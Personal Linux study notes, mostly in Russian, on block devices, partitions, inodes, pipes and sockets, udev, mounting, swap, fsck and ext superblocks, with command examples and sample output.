GPT fdisk (gdisk) version 1.0.8
Partition table scan:
  MBR: MBR only
  GPT: not present  // раздел БЕЗ GPT !!
Disk /dev/sdb: 4030464 sectors, 1.9 GiB
Model: USB DISK 2.0
Sector size (logical/physical): 512/512 bytes
Disk identifier (GUID): D891FCB9-2003-4A2C-A0AE-2174A1D8B231
Partition table holds up to 128 entries
Main partition table begins at sector 2 and ends at sector 33
First usable sector is 34, last usable sector is 4030430
Partitions will be aligned on 512-sector boundaries
Total free space is 4925 sectors (2.4 MiB)
Number  Start (sector)    End (sector)  Size       Code  Name
   1            2048         1983999   967.8 MiB   0700  Microsoft basic data
   2         1984000         4027519   997.8 MiB   0700  Microsoft basic data

7!) полезная ДОПОЛН-Я (ЗАГРУЖАЕМАЯ) программа lsscsi 
whereis lsscsi
  lsscsi: /usr/bin/lsscsi /usr/share/man/man8/lsscsi.8.gz
lsscsi -c
 Attached devices:
 Host: scsi1 Channel: 00 Target: 00 Lun: 00
   Vendor: VBOX     Model: CD-ROM           Rev: 1.0
   Type:   CD-ROM                           ANSI SCSI revision: 05
 Host: scsi2 Channel: 00 Target: 00 Lun: 00
   Vendor: ATA      Model: VBOX HARDDISK    Rev: 1.0
   Type:   Direct-Access                    ANSI SCSI revision: 05
lsscsi
  [1:0:0:0]    cd/dvd  VBOX     CD-ROM           1.0   /dev/sr0
  [2:0:0:0]    disk    ATA      VBOX HARDDISK    1.0   /dev/sda

sudo hexdump -C /dev/sda1 | less // прочитать дамп данных с раздела диска
DOS partition table (FAT) =понятию= OSF disklabel (для ext Linux)

ls /sys/block/sdb/sdb2 // прочитать инф usb диске через sys 
cat /sys/class/block/sdb/queue/logical_block_size // размер логического блока
cat /sys/class/block/sdb/queue/physical_block_size //размер физического блока
 cat /sys/block/sdb/stat  //статистика о всем usb диске через sys 
cat /sys/block/sdb/size //статистика о всех раздлах usb диске через sys 
cat /sys/block/sdb/sdb2/partition //статистика о  разделе 2 usb дискa через sys 
cat /proc/devices  // информация обо всех драйверах устройств

================ типы  inode i-node |/файлов pipe socket IPC inter process comunication =============
man inode:
"Каждый файл имеет индексный дескриптор, содержащий метаданные о файле. Приложение может получить эти метаданные с помощью stat(2) (или связанных вызовов), который возвращает структуру stat, или statx(2), который возвращает структуру statx.
 Ниже приведен список информации, которая обычно находится в индексном дескрипторе файла или связана с ним, с именами соответствующих полей структуры, возвращаемых stat(2) и statx(2):
Каждый индексный дескриптор (а также связанный с ним файл) находится в файловой системе, размещенной на устройстве /dev. Это устройство идентифицируется комбинацией его основного идентификатора (который идентифицирует общий класс 
устройства) и второстепенного идентификатора (который идентифицирует конкретный экземпляр в общем классе).
    Каждый "файл! в файловой системе имеет уникальный i-node. Номера i-node гарантированно уникальны только внутри файловой системы (т. е. одни и те же номера индексных дескрипторов могут использоваться в разных файловых системах, что является причиной того, что жесткие ссылки не могут пересекать границы файловой системы)!!!!"
Подробно читать в "Файловые системы UFS ext NTFS FAT  EFI  ESP GPT LBA BIOS MBR (22.10).doc"


 !! i-node - метаданные файла ,специальная запись в таблице суперблока файловых систем (fs)
   ext,xfs...!!!!
Содержит данные файла: Length/Размер, Ninode, Кол-воЖесткихссылки, Типфайла, AccessMode (rwx),
  Owner:Uid:Gid,время Доступа, Модификации, Изменения, Создания файла


Для ext систем количество i-node задается при форматировании раздела и опеделено настройками при фороматировании (количество i-node на n-блоков раздела с fs -inode_ratio, и размер inode_size, см man mke2fs). Если неоптимально выбрано это соотношения (например блоки определены 4096 байт, но при этом множество мелких файлов << одного блока, i-node могут исчерпаться много быстрее свободных блоков на разделе). В xfs - inode не создаются статически сразу, а создаются динамически при создании файлов.
man mke2fs
-i bytes-per-inode  - соотношение байт/инод. mke2fs создает индексный дескриптор для каждого байта пространства на диске. Чем больше соотношение байтов к инодам, тем меньше инодов будет создано. Обычно это значение не должно быть меньше размера блока файловой системы, поскольку в этом случае будет создано больше индексных дескрипторов, чем можно будет использовать. Предупреждаем, что изменить это соотношение в файловой системе после ее создания невозможно, поэтому будьте осторожны, выбирая правильное значение для этого параметра. 
-I inode-size - размер каждого индексного дескриптора в байтах. Значение размера индексного дескриптора должно быть степенью 2, большей или равной 128. Чем больше размер индексного дескриптора, тем больше места будет занимать таблица индексных дескрипторов, а это уменьшает полезное пространство в файловой системе, а также может отрицательно повлиять на производительность. Это значение невозможно изменить после создания файловой системы. Файловые системы с размером индексного дескриптора 128 байт не поддерживают метки времени после 19 января 2038 года. Индексные дескрипторы размером !256! байт и более будут поддерживать расширенные метки времени, идентификаторы проектов и возможность хранить некоторые расширенные атрибуты в таблице индексных дескрипторов для повышения производительности.

Нельзя изменить количество Inode для существующей файловой системы, зато можно указать для новой с помощью опции -N. mkfs -t ext4 -N 3000000 /dev/sda1  //!!!!!!!!!!!!!!!!!!

Размер inode по умолчанию определеется файлом /etc/mke2fs.conf По умолчанию составляет 256 байт для большинства файловых систем, за исключением небольших файловых систем

cat /etc/mke2fs.conf // настройки форматирвания файловых систем fs ext2/ext3/ext4 программы mke2fs
[defaults]
        base_features = sparse_super,large_file,filetype,resize_inode,dir_index,ext_attr
        default_mntopts = acl,user_xattr
        enable_periodic_fsck = 0
        blocksize = 4096
        inode_size = 256
        inode_ratio = 16384
[fs_types]
        small = {    inode_ratio = 4096     }
        floppy = {                inode_ratio = 8192        }
        big = {                inode_ratio = 32768        }


 =*=*= ПРОСМОТР иинформации об inode i-node =*=*= 
stat ffind // просмотр № i-node inode файла
  Файл: ffind
  Размер: 146           Блоков: 8          Блок В/В: 4096   обычный файл
Устройство: 801h/2049d  Инода: 561991      Ссылки: 3
Доступ: (0775/-rwxrwxr-x)  Uid: (29999/     oem)   Gid: (29999/     oem)
Доступ:        2023-10-28 19:39:38.375575147 +0300
Модифицирован: 2023-09-17 20:28:42.966997808 +0300
Изменён:       2023-10-29 15:05:56.339101443 +0300
Создан:        2023-08-27 17:39:10.634120747 +0300
РАСШИФРОВКА Информации о inode файла (имена файла - hardlinks - содержаться в каталоге):
1 "Инода" Номер inode / i-node
2 -rw-r-r-- Права доступа к файлу. Первый символ указывает тип файла
3 "Ссылки" Количество жестких ссылок (hardlink/имена) файла (для каталога dir это минимум "2" = "./","../")
 Uid: Имя пользователя, владеющего файлом  Gid: Имя группы, владеющей файлом
6 "Размер" Размер файла в блоках
7 Даты и время доступа изменения файла 

ls -il f123t // Номер i-node inode файла, первое поле
479661 -rw-rw-r-- 1 oem oem 0 апр 17  2023 f123t

df -i /dev/sdb5 // информация о кол-ве i-node inode на разделе 5 ext2
Filesystem     Inodes IUsed  IFree IUse% Mounted on
/dev/sdb5      122112    17 122095    1% /media/mint/d6aef018-84fd-4056-93fb-56168fac22f3
df -i /dev/sdb2 // информация о кол-ве СВОБОДНЫХ ОСТАЮЩИХСЯ i-node inode на разделе !
Filesystem     Inodes IUsed  IFree IUse% Mounted on
/dev/sdb2      440496    33 440463    1% /media/mint/Новый том
df -i /dev/sdb //  информация о кол-ве i-node на всех разделaх usb

du --inodes // оценить использование индексных дескрипторов inodes в тек. каталоге
sudo tune2fs -l /dev/sda1 // !!!! лучшая команда статистики по inode и др данным fs
sudo debugfs /dev/sda1  
debugfs: stat <2>

В i-node inode/индексном дескрипторе файла устройства dev содержится внутреннее имя устройства,
  состоящее из обозначения типа символа c для СИМВОЛЬНОГО или b для БЛОЧНОГО, и пара чисел, 
 называемых старшим и младшим номерами устройства. Диски и ленты являются блочными устройствами, 
 а все остальные – терминалы, принтеры, телефонные линии и т. д. – символьными. Старший номер
 (major) определяет тип/driver/драйвер устройства, а младший (minor) обозначает конкретный 
 экземпляр устройства. Например, /dev/tty0 и /dev/ tty1 – это два порта контроллера терминала 
 и поэтому

cat /proc/devices  // перечень major devices
Character devices:
  1 mem
  4 /dev/vc/0
  4 tty
  4 ttyS
  5 /dev/tty
  5 /dev/console
  5 /dev/ptmx
  5 ttyprintk
  6 lp
  7 vcs
 10 misc
 13 input
 21 sg
 29 fb
 89 i2c
 99 ppdev
108 ppp
...
253 tpm
254 gpiochip

Block devices:
  7 loop
  8 sd
  9 md
 11 sr
 65 sd
 ...
230 zvol
253 device-mapper
254 mdp
259 blkext

Кетов "Мониторинг файлов, устройств и сетевых сокетов в Linux.mp4" - любой сокет - Unix или tcpip - ФАЙЛЫ!


Кетов книга р.3.2.6
Кетов Видео "Основы Linux Дерево Каталогов"
файлы типа pipe (именованные каналы, FIFO-файлы) служат для однонаправленной FIFO передачи данных между процессами
19:44 6/4/2023 // initctl - файл pipe - именованный канал управления (передачи информации) для процесса systemd/init (см ниже sudo lsof /dev/initctl)
483 prw------- 1 root root 0 мая  8 21:22 /dev/initctl
stat /run/initctl // он же, выше симв ссылка на него
    Файл: /run/initctl
    Размер: 0             Блоков: 0          Блок В/В: 4096   файл-очередь // !!!!!
  Устройство: 18h/24d     Инода: 641         Ссылки: 1

sudo lsof /dev/initctl // узнать процесс, который читает файл initctl; sudo обязательно!
COMMAND PID USER   FD   TYPE DEVICE SIZE/OFF NODE NAME
systemd   1 root   37u  FIFO   0,24      0t0  641 /run/initctl

sudo find /run/ -type p 2>/dev/null // поиск файлов pipe


файлы типа socket (сокет) служат для   передачи данных между процессами по схеме клиент сервер, 
       один процесс сервер, наприаер, 3 процесса - клиенты
ls -il  /dev/log  // файл-ссылка на  socket 
  446 lrwxrwxrwx 1 root root 28 мая  8 21:22 /dev/log -> /run/systemd/journal/dev-log
ls -il /run/systemd/journal/dev-log // сам файл  socketа системного журнала syslog , демона syslogd
  484 srw-rw-rw- 1 root root 0 мая  8 21:22 /run/systemd/journal/dev-log
stat /run/systemd/journal/dev-log
  Файл: /run/systemd/journal/dev-log
  Размер: 0             Блоков: 0          Блок В/В: 4096   сокет    //!!
  Устройство: 18h/24d     Инода: 642         Ссылки: 1

Далее находим pid процесса syslogd

ps aux | grep syslogd или можно `pgrep syslogd` 
syslog       677  0.0  0.2 222400  5512 ?        Ssl  21:22   0:00 /usr/sbin/rsyslogd -n -iNONE
 
Затем находим что syslogd=/usr/sbin/rsyslogd держит открытым журнал /var/log/syslog
sudo lsof -p 677  // // показать файлы, открытые процессом pid=677
COMMAND  PID   USER   FD   TYPE             DEVICE SIZE/OFF       NODE NAME
rsyslogd 677 syslog  cwd    DIR                8,1     4096          2 /
rsyslogd 677 syslog  rtd    DIR                8,1     4096          2 /
rsyslogd 677 syslog  txt    REG                8,1   785600     140732 /usr/sbin/rsyslogd
rsyslogd 677 syslog    7w   REG                8,1   328423    1260855 /var/log/syslog
ИЛИ 
sudo lsof /run/systemd/journal/dev-log // показать процессы, работающие с файлом
COMMAND   PID USER   FD   TYPE             DEVICE SIZE/OFF  NODE NAME
systemd     1 root   39u  unix 0xffff98f141061540      0t0 17367 /run/systemd/journal/dev-log type=DGRAM
systemd-j 373 root    3u  unix 0xffff98f141061540      0t0 17367 /run/systemd/journal/dev-log type=DGRAM

ls -ilL /tmp/ssh-XXXXXXRHhBmE/agent.2692 //временный файл сокета sshd
965036 srw------- 1 oem oem 0 мая 29 23:49 /tmp/ssh-XXXXXXRHhBmE/agent.2692



######### СЛУЖБА демон udevd  ####################
Кетов Админ-е 3.2: udev юниверсал девайс демон - его задачи: 
 1)следит за устройствами (сигналами от ядра при подключении устройств),
 2)обнаруживает их подключение устройств:
 "https://www.youtube.com/watch?v=zvk0NNrDTow&t=123s
 При подключении нового физ. устройства ядро обраруживает это устройство через диспетчер устройств?
 ядро формирует сигналы (видны через sudo dmesg -wH, sudo journalctl -ekf),
 которые отслеживает демон udevd. 
 udevd,применяя правила /usr/lib/udev/rules.d/....  см выше раздел "= ^ = Ядро, udev создание ...."
 3)автоматически запускает команды ("применяя пере этим правила /usr/lib/udev/rules.d/....")
  3.1 mknod/MAKEDEV (создает файл устройства) и 3.2 insmod/modprob - загружает драйвер в ядро

 "В современных ядрах при подключении оборудования модули подключаются автоматически, а это 
 событие обрабатывается демоном udevd, который создает соответствующий файл устройства в каталоге
  "/dev". Все это выполняется в том случае, если соответствующий модуль корректно установлен в
  дерево модулей. В случае с файловыми системами ситуация та же: при попытке монтирования 
 файловой системы ядро подгружает необходимый модуль автоматически, и выполняет монтирование.
 https://habr.com/ru/post/117654/"
 "Менеджер udevd дает имена ссылкам по типу интерфейса при подключении дисков к ядру, а затем 
 по информации об изготовителе и модели, серийному номеру и разделу. // Внутрустройство Linux.pdf
(СМ ниже подробно РАЗДЕЛ о модулях драйверах!!!)

udevadm info /dev/sdb5 // запрос  к ядру информации от демона udevd о разделе 5 usb накопителя
E: DEVNAME=/dev/sdb5
E: ID_FS_TYPE=ext2
      
udevadm monitor // online мониторинг сообщений от ядра, относящихся в dev устройствам
monitor will print the received events for:
UDEV - the event which udev sends out after rule processing
KERNEL - the kernel uevent
   // обнаружение usb устр-ва и scsi и sdb устройств 
 // Ниже листинг ПРИ ПОДКЛЮЧЕНИИ USB-НАКОПТ с 4 разделами(3 раздела md raid0:sdb1,sdb3,sdb4, 1 раздел sdb2- fat32)
KERNEL[994.019366] add      /devices/pci0000:00/0000:00:0b.0/usb1/1-1 (usb)
KERNEL[994.021599] add      /devices/pci0000:00/0000:00:0b.0/usb1/1-1/1-1:1.0 (usb)
KERNEL[994.021712] bind     /devices/pci0000:00/0000:00:0b.0/usb1/1-1 (usb)
UDEV  [994.026324] add      /devices/pci0000:00/0000:00:0b.0/usb1/1-1 (usb)
KERNEL[994.040829] add      /devices/virtual/workqueue/scsi_tmf_3 (workqueue)
KERNEL[994.041260] add      /devices/pci0000:00/0000:00:0b.0/usb1/1-1/1-1:1.0/host3 (scsi)
KERNEL[994.041278] add      /devices/pci0000:00/0000:00:0b.0/usb1/1-1/1-1:1.0/host3/scsi_host/host3 (scsi_host)
KERNEL[994.041295] bind     /devices/pci0000:00/0000:00:0b.0/usb1/1-1/1-1:1.0 (usb)
KERNEL[994.041303] add      /bus/usb/drivers/usb-storage (drivers)
KERNEL[994.041309] add      /module/usb_storage (module)
UDEV  [994.043042] add      /bus/usb/drivers/usb-storage (drivers)
UDEV  [994.044202] add      /module/usb_storage (module)
UDEV  [994.045166] add      /devices/virtual/workqueue/scsi_tmf_3 (workqueue)
KERNEL[994.051414] add      /bus/usb/drivers/uas (drivers)
UDEV  [994.051464] add      /devices/pci0000:00/0000:00:0b.0/usb1/1-1/1-1:1.0 (usb)
....
UDEV  [1000.225138] bind     /devices/pci0000:00/0000:00:0b.0/usb1/1-1/1-1:1.0/host3/target3:0:0/3:0:0:0 (scsi)
UDEV  [1000.537588] change   /devices/virtual/block/md123 (block)
KERNEL[1005.111653] change   /devices/pci0000:00/0000:00:0b.0/usb1/1-1/1-1:1.0/host3/target3:0:0/3:0:0:0/block/sdb/sdb2 (block)
UDEV  [1005.445979] change   /devices/pci0000:00/0000:00:0b.0/usb1/1-1/1-1:1.0/host3/target3:0:0/3:0:0:0/block/sdb/sdb2 (block)
 //Отмонтирование всех разделов флешки
KERNEL[41491.992558] remove   /devices/virtual/workqueue/scsi_tmf_3 (workqueue)
KERNEL[41491.992715] unbind   /devices/pci0000:00/0000:00:0b.0/usb1/1-1/1-1:1.0 (usb)
KERNEL[41491.992740] remove   /devices/pci0000:00/0000:00:0b.0/usb1/1-1/1-1:1.0 (usb)
KERNEL[41491.992829] unbind   /devices/pci0000:00/0000:00:0b.0/usb1/1-1 (usb)
KERNEL[41491.992856] remove   /devices/pci0000:00/0000:00:0b.0/usb1/1-1 (usb)
UDEV  [41491.993739] remove   /devices/virtual/workqueue/scsi_tmf_3 (workqueue)
UDEV  [41491.995540] reпримонтированнми es/pci0000:00/0000:00:0b.0/usb1/1-1/1-1:1.0/host3 (scsi)
UDEV  [41491.998205] unbind   /devices/pci0000:00/0000:00:0b.0/usb1/1-1/1-1:1.0 (usb)
UDEV  [41491.999655] remove   /devices/pci0000:00/0000:00:0b.0/usb1/1-1/1-1:1.0 (usb)
UDEV  [41492.001296] unbind   /devices/pci0000:00/0000:00:0b.0/usb1/1-1 (usb)
UDEV  [41492.003321] remove   /devices/pci0000:00/0000:00:0b.0/usb1/1-1 (usb)

 = =  = = ПРИНУДИТЕЛЬНОЕ Отключение udevd = = = = 
командами $:systemctl status udev.service = service udev status
 sudo systemctl stop udev.service
Warning: Stopping udev.service, but it can still be activated by:
  systemd-udevd-control.socket
  systemd-udevd-kernel.socket
После выполнения остановки службы udev и еще 2х сокетов (sudo systemctl stop  systemd-udevd-control.socket; sudo systemctl stop systemd-udevd-kernel.socket; sudo systemctl stop udev.service), все равно GIU продолжает !"обнаруживать"/"Отрисовывать"!   диски на флешке в дереве каталогов окон, НО ни прочитать ничего с них, ни записать ни через GUI ни через bash на них нельзя. Очивидно они остаются "отображенными" из инф-ции из кеша
При отключенном udevd: Можно смонтировать вручную отдельный диск в нужный каталог (/mnt/sd) и работать с ним, можно заново собрать md, смонтировать его и работать с ним, как через bash так и GIU (но не получилосЬ записывать/сохранять, времени не хватило присвоить права на o+w). В GUI каталоги c примонтированными дисками доступны только в папке монтирования, например /mnt/sd, но не доступны через спец значки для внешних дисков GUI

sudo od /dev/input/mouse2 // открыть дамп, поступающий от устройства мыши, ниже данные от порта мыши 
0000000 077450 024201 100522 000050 014224 021765 174030 014043

sudo od /dev/disk/by-uuid/6486663E4CCF1CBC //открыть дамп, поступающий от накопителя по UUID
UUID (Universally Unique Identifier, универсальный уникальный идентификатор) своего рода серийный номер, создается при форматировании
# mount UUID=a9011c2b-1c03-4288-b3fe-8ba961ab0898 /home/extra
Disk /dev/sdc: 1.92 GiB, 2063597568 bytes, 4030464 sectors
Disk model: USB DISK 2.0    
Units: sectors of 1 * 512 = 512 bytes
Sector size (logical/physical): 512 bytes / 512 bytes
I/O size (minimum/optimal): 512 bytes / 512 bytes
Disklabel type: dos
Disk identifier: 0x002752f4

Device     Boot Start     End Sectors  Size Id Type
/dev/sdc1  *     2048 4030463 4028416  1.9G 83 Linux

Подкачка swap раздел  ПРОСМОТР подкачки
swapon --show
NAME      TYPE      SIZE   USED PRIO
/dev/sda2 partition 1,8G 113,7M   -2

free -h
               total        used        free      shared  buff/cache   available
Память:      1,9Gi       667Mi        75Mi        17Mi       1,2Gi       1,1Gi
Подкачка:      1,8Gi       2,0Mi       1,8Gi

top 
Tasks: 191 total,   1 running, 190 sleeping,   0 stopped,   0 zombie
%Cpu(s):  0,0 us,  0,0 sy,  0,0 ni, 99,8 id,  0,2 wa,  0,0 hi,  0,0 si,  0,0 st
МиБ Mem :   1975,8 total,     75,4 free,    667,7 used,   1232,6 buff/cache
МиБ Swap:   1850,0 total,   1847,7 free,      2,3 used.   1118,3 avail Mem

strace -e openat top //top берeт инфу из /proc/
openat(AT_FDCWD, "/proc/2282/stat", O_RDONLY) = 9
openat(AT_FDCWD, "/proc/2282/statm", O_RDONLY) = 9
openat(AT_FDCWD, "/proc/2341/stat", O_RDONLY) = 9
openat(AT_FDCWD, "/proc/2341/statm", O_RDONLY) = 9
openat(AT_FDCWD, "/proc/2353/stat", O_RDONLY) = 9
openat(AT_FDCWD, "/proc/2353/statm", O_RDONLY) = 9


cat /proc/meminfo | grep -i swap // отфильтровать строки со словом swap без (-i)учета регистра!

sudo apt install smem

 = =  = mount  = = =
mount // выведет список файловых систем дисков и tmpfs, смонтированных в настоящий момент
  /dev/sdb1 on /media/mint/Transcend  type vfat..... 
  /dev/sda1 on /     type ext4 (rw,errors=remount-ro)
  proc on /proc      type proc (rw,noexec,nosuid,nodev)
  sysfs on /sys      type sysfs (rw,noexec,nosuid,nodev)
  ^тип fs! ^точка монт-ния fs!^тип(type) fs


mount -t iso9660 /dev/hdc /mnt/cdrom // замонтироваить CD  в /mnt/cdrom 
mount -r /dev/sdb2 ~/mntdsk // примонтировать флешку в режиме только чтение
umount /media/oem/disk //ОТмонтировать !првязку тома usb-устройство! от точки монтирования /media/oem/, при этом само usb-устройство отсанется привязанным в ОС
sudo umount /dev/sdb2 /ОТмонтировать ПОЛНОСТЬЮ usb-устройство! от точки монтирования /dev/sdb2 
sudo umount /dev/md2 /ОТмонтировать ПОЛНОСТЬЮ мета-устройство RAID! от точки монтирования/dev/md2 


df  // disk free просмотр инф-ции о дисках!
Filesystem     1K-blocks    Used Available Use% Mounted on
tmpfs             202324    1216    201108   1% /run
/dev/sr0         2581332 2581332         0 100% /cdrom
/cow             1011608  458288    553320  46% /
tmpfs            1011608       0   1011608   0% /dev/shm
tmpfs               5120       4      5116   1% /run/lock
tmpfs            1011608     600   1011008   1% /tmp
tmpfs             202320    1696    200624   1% /run/user/999
/dev/sdb1        2010112  275952   1734160  14% /media/mint/Transcend 

file /proc/partitions 
/proc/partitions: empty// те файл ПУСТОЙ!, но в cat печатает инф.о разделах.Файл формируется налету
cat /proc/partitions
major minor  #blocks  name
   7     0    2423324 loop0
  11     0    2585612 sr0
   8     0    9763008 sda
   8    32    2015232 sdc
   8    33      98976 sdc1
   8    34     409600 sdc2
   8    35          1 sdc3
   8    36    1015232 sdc4
   8    37     488448 sdc5

cat /sys/block/sdb/sdb2/start   // печать начала раздела диска с блока номер
200064 

tmpfs — это временная файловая система, которая находится в памяти и/или вашем разделе(ах) подкачки 
Временное файловое хранилище во многих Unix-подобных ОС. Предназначена для монтирования файловой системы, но размещается в ОЗУ вместо физического диска.

Точка монтирования — это самый обычный каталог где-то в дереве файловой системы. В таком каталоге нет ничего необычного. Он даже не должен быть пустым каталогом, правда, монтирование устройства в непустой каталог сделает его прежнее содержимое недоступным, пока устройство не будет размонтировано
ls /media/mint/Tricdent // папка по умолчн, куда монтируся флешдиск

Перемонтировать фл.диск в другую папку /mint/mnt/fldsk/
mount -t vfat /dev/sdb1 ~/mnt/fldsk/ // ПРИ ЭТОМ В GUI-проводнике появлятся два типа носителй Tricdent и fldsk (2 линка на устройство)!
sudo tail -f /var/log/syslog // просмотр системный журнал system log syslog ОС Linux (все сообщения, в  т.ч. при монтировании sdb1) 

mint@mint:~$ ls -il /dev/
total 0

 1417 crw-------  1 root root    240,   0 Jan 23 19:46 hidraw0
  121 crw-------  1 root root     10, 228 Jan  5 16:32 hpet
14780 drwxr-xr-x  2 root root           0 Jan  5 16:32 hugepages
  122 crw-------  1 root root     10, 183 Jan  5 16:32 hwrng
  170 crw-------  1 root root     89,   0 Jan  5 16:32 i2c-0
 
   11 crw-r--r--  1 root root      1,  11 Jan  5 16:32 kmsg
   
  123 crw-rw----  1 root disk     10, 237 Jan  5 16:32 loop-control
  124 brw-rw----  1 root disk      7,   0 Jan  5 16:32 loop0

  = = =  fsck  e4defrag Проверка и дефрагментация файловых систем  = = = =
//  !!! fsck - проверку дисков и дефрагменацию делать толко при отмонтированно состоянии дисков/томов, иначе возможны повреждения! 
Дефрагментация диска https://losst.pro/defragmentatsiya-diska-linux 
Чтобы посмотреть какая сейчас фрагментация диска можно использовать утилиту fsck. Ей надо передать параметр -f. Чтобы в файловую систему не вносились никакие изменения используйте опцию -n:
sudo fsck -fnv /dev/sdb1
Проход 1: Проверка inodes, блокs, а также размеров
Pass 2: Checking каталог structure Pass 3: Checking каталог connectivity Pass 4: Checking reference counts Pass 5: Checking группа summary information
/dev/sdb1: 125326/379008 files (0.2% non-contiguous), 1211381/1513472 blocks
   125326 inodes used (33.07%, out of 379008)
          82 non-contiguous files (0.1%)
         107 non-contiguous directories (0.1%)
             # of inodes with ind/dind/tind blocks: 0/0/0
             Extent depth histogram: 112482/28
     1211381 blocks used (80.04%, out of 1513472)
           0 bad blocks
           1 large file

      101584 regular files
       10781 directories
           8 character device files
           0 block device files
         533 links
       12943 symbolic links (12799 fast symbolic links)
  
------------
      125850 files
 Фрагментация указывается в скобках и измеряется в процентах, обычно она очень маленькая и не достигает даже одного процента.!!Не рекомендуется выполнять проверку на примонтированной системе!! иначе вы получите кучу ложных ошибок, однако если с файловой системой не будут выполнятся никакие действия, то вы ничего не повредите. Для дефрагментации нам понадобится утилита e4defrag, находящаяся в папке e2fsprogs.
Теперь можете дефрагментировать нужный раздел. Например, тот же /dev/sdb1. Но перед дефрагментацией раздел надо примонтировать: sudo mount /dev/sdb1 /mnt
Затем дефрагментация Ext4: sudo e4defrag /dev/sdb1
После этого можно снова проверить фрагментацию. Если есть возможность, лучше отмонтировать перед этим раздел. Как видите, теперь фрагментация 0%: sudo fsck -fn /dev/sdb1
  = = = END  fsck  e4defrag Проверка и дефрагментация файловых систем  = = = =

  = = = = Суперблок = = =  =
https://4admin.info/linux-superblock/  "Суперблок в линуксе"
Блок файловой системы (см ТиО выше в "= =  ФАЙЛЫ И ФАЙЛОВЫЕ ДИСКОВЫЕ СИСТЕМЫ = ")
После форматирования диска или раздела сектора на диске разделены на небольшие группы. 
Такая группа секторов называется блоком. 
Размер блока может быть разным и задается как параметр ключа команды форматирования. Например
mkfs -t ext3 -b 4096 /dev/sda1
ключ -b задает размер блока в байтах, в данном случае размер блока будет 4096 байт

Размер блока может быть разным. Это зависит от типа файловой системы

Ext2 — 1Кб, 2Кб, 4Кб, 8Кб
Ext3 — 1Кб, 2Кб, 4Кб, 8Кб
Ext4 — от 1Кб до 64Кб
При выборе размера блока нужно учесть ряд моментов

Максимальный размер файла
Максимальный размер файловой системы
Производительность
Размер блока влияет на скорость чтения/записи с диска. Представим себе файл размеров в несколько сот мегабайт, который считывается с диска блоками по 1Кб. Тот же файл будет считываться быстрее если размер блока файловой системы будет 4Кб или 8Кб. Это ясно. Поэтому при форматировании имеет смысл задать блок большего размера, если планируется использовать файлы большого размера

Также верно и обратное утверждение. В случае хранения небольших файлов лучше использовать блоки минимального размера

Ядро Linux работает с размером блока файловой системы, а не с размером сектора диска (обычно 512 байт). Важно понимать, что размер блока файловой системы не может быть меньше размера сектора диска и всегда будет кратным ему. Также ядро ожидает, что размер блока файловой системы будет меньше или равно размеру системной страницы

Размер системной страницы можно увидеть выполнив команду

# getconf PAGE_SIZE
4096
Группы блоков файловой системы
Блоки, о которых мы говорили ранее обьеденяются в группы блоков, что позитивно отражается на операциях чтения/записи так как уменьшается время чтения/записи больших обьемов данных

Файловая система EXT разбивает все доспупное пространство на группы блоков равного размера. Эти группы располагаются последовательно, одна за другой

Загрузочный блок Группа блоков 1	Группа блоков 2	Группа блоков 2	Группа блоков 3
Количество блоков в группе неизменно и может быть расчитано по формуле 8*размер блока

Взглянем на вывод команды mke2fs
# mke2fs /dev/sdb   // ОСТАРОЖНО! отфлорматирует раздел!
mke2fs 1.42.9 (4-Feb-2014)
Filesystem label=
OS type: Linux
Block size=4096 (log=2)
Fragment size=4096 (log=2)
Stride=0 blocks, Stripe width=0 blocks
6553600 inodes, 26214400 blocks
1310720 blocks (5.00%) reserved for the super user
First data block=0
Maximum filesystem blocks=4294967296
800 block groups
32768 blocks per group, 32768 fragments per group
8192 inodes per group
Superblock backups stored on blocks:
 32768, 98304, 163840, 229376, 294912, 819200, 884736, 1605632, 2654208, 4096000, 7962624, 11239424, 20480000, 23887872
 
Отметим то, о чем говорили выше
Размер блока 4096 байт
800 блоковых групп
32768 блоков в группе (8*4096)
Также видны блоки в которых хранятся резервные копии суперблока

Так что же такое суперблок?
Самым простым определением суперблока могло бы быть следующее утверждение

Суперблок — это блок в котором хранятся метаданные файловой системы !!!!!

Аналогично тому, как i-node хранят метаданные о файлах, суперблок ("аналог" i-node) хранит метаданные о файловой ситеме. 
Если вдруг суперблок поврежден, то не возможно будет примонтировать файловую систему. Обычно при загрузке система проверяет суперблок и при необходимости исправляет его, что в результате приводит к корректному монтированию файловых систем

Цилиндр в настощее время носит название группа блоков/Blocks Group -
Цилиндр/группа блоков = «Суперблок (КЛОН заглавного Суперблока)»+ «Таблица! i-nodes»+ «список BlockBitMap»+Множества блоков файловой системы (содержащих фрагменты файлов)

Некоторые данные, которые хранятся в суперблоке (mke2fs, sudo tune2fs -l /dev/sda1). Например

Количество блоков в файловой системе
Количество свободных блоков в файловой системе
Количество i-node в блоковой группе
Блоки в блоковой группе
Количество запусков файловой системы со времени последней проверки fsck
UUID файловой системы
Состояние файловой системы (была ли корректно размонтирована, обнаруженые ошибки и т.д.)
Тип файловой системы
Операционная система в которой была отформатирована данная файловая система
Время последнего монтирования
Время последней записи
Основная копия суперблока хранится в самой первой группе блоков. Она названа основной, потому что считывается системой в процессе монтирования файловой системы. Так как отсчет блоковых групп начинается с 0 то можно говорить о том, что суперблок хранится в начале блоковой группы 0

Суперблок весьма критичен для файловой системы. Поэтому в каждой блоковой группе есть копии суперблока. Это дает нам право думать, что поврежденный суперблок будет восстановлен всякий раз, когда это будет необходимо

Может показаться, что наличие в каждой блоковой группе резервных копий суперблока приводит к потреблению большого дискового пространства. Для этого в последних версиях систем была реализована функция «sparse_super» целью которой было создание резервных копий в группе блоков 0, 1, 3, 5, 7

Как увидеть, что хранится в суперблоке?
Для этого воспользуемся командой dumpe2fs

# 
 /dev/sda1 (cm выше!)
 
Еще один вывод команды показывает информацию о суперблоке

# dumpe2fs /dev/sda1 | grep -i superblock
dumpe2fs 1.42.9 (4-Feb-2014)
 Primary superblock at 0, Group descriptors at 1-15
 Backup superblock at 32768, Group descriptors at 32769-32783
  ...
 Backup superblock at 23887872, Group descriptors at 23887873-23887887
Как восстановить поврежденный суперблок?
Для начала нужно проверить файловую систему утилитой fsck 
//  
!!!  fsck - проверку дисков делать толко при отмонтированно состоянии дисков/томов, иначе возможны повреждения! 
//
# fsck.ext3 -v /dev/sda1  
В случае если fsck  обнаружила ошибку чтения суперблока можно попробовать сделать следующее:
Для начала определим где расположены резервные копии суперблока. Для этого выполняем
# dumpe2fs /dev/sda1 | grep -i superblock  
или  # mke2fs -n /dev/sda1 //ключ -n говорит команде не создавать файловую систему, но показать вывод какой мог бы быть при реальном создании файловой системы

Далее восстановливаем суперблок из бекапа при помощи e2fsck ( man e2fsck - check a Linux ext2/ext3/ext4 file system)

